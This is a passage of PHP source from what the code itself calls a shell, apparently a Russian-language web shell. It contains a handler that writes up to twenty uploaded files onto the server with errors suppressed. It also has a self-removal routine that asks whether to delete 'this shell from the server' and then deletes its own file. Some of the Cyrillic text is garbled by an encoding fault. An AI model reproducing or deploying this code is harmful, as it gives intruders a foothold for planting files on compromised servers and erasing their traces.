if (@move_uploaded_file(@$_FILES['text16']['tmp_name'], $uploadfile16)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile16</i><br>";}
if (@move_uploaded_file(@$_FILES['text17']['tmp_name'], $uploadfile17)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile17</i><br>";}
if (@move_uploaded_file(@$_FILES['text18']['tmp_name'], $uploadfile18)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile18</i><br>";}
if (@move_uploaded_file(@$_FILES['text19']['tmp_name'], $uploadfile19)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile19</i><br>";}
if (@move_uploaded_file(@$_FILES['text20']['tmp_name'], $uploadfile20)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Загружен? $uploadfile20</i><br>";}
}

exit;
break;
case "selfremover":
 print "<tr><td>";
print "<font color=red face=verdana size=1>Ты уверен, чт?хоче?удалит?этот шелл ?сервер??<br>
<a href='$php_self?p=yes'>Да, хочу</a> | <a href='$php_self?'>Не? пуст?ещ?побуде?/a><br>
Буде?удалять: <u>";
$path=__FILE__;
print $path;
print " </u>?</td></tr></table>";
die;
}

if($p=="yes"){
$path=__FILE__;
@unlink($path);
$path=str_replace("\\","/",$path);
if(file_exists($path)){$hmm="Файл невозможно удалит?!!";
print "<tr><td><font color=red>Файл $path не удален !</td></tr>";
}else{$hmm="Удален";}
print "<script>alert('$path $hmm');</script>";

}
break;


?>



